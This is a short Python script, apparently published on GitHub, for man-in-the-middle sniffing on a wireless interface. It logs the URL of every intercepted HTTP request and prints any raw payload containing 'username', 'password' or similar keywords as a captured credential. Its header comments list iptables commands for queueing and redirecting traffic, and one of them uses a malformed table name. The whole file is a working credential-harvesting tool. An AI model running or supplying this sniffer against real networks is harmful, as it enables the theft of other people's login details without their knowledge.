#!/usr/bin/env python
# 
# 
# sudo iptables -I FORWARD  -j NFQUEUE --queue-num  0
# sudo iptables --flush
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0  : to test on loal host
# sudo iptables -I INPUT -j NFQUEUE --queue-num 0  : to test on loal host
# sudo iptables -t wlan0/nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#
# python code to sniff packets trasmitted through connected network as man in the middle
# This code needs two dependencies: netfilterqueue and scapy which is available on python 2.7
# You need a linux system
# for more documentation visit my github page: github.com/secbot01
# pull requests, always welcome
# code published under MIT LICENSE
#                   	code contributed by: @nibrasmuhamed and @muhammednahil on Github



from __future__ import print_function
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=sniffed_packets)#filter="arp"

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def login_info(packet):
	if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load
			keywords = ["username", "user", "login", "password", "pass"]
			for keyword in keywords:
				#key = bytes(keyword, 'utf-8')
				if keyword in load:
					return load

def sniffed_packets(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP Requset >> "+ url)

		login_out = login_info(packet)
		if login_out:
			print("\n\n[+] Possible username or password >> " + login_out + "\n\n")


try:
	sniff("wlan0")
except:
	print('bye!')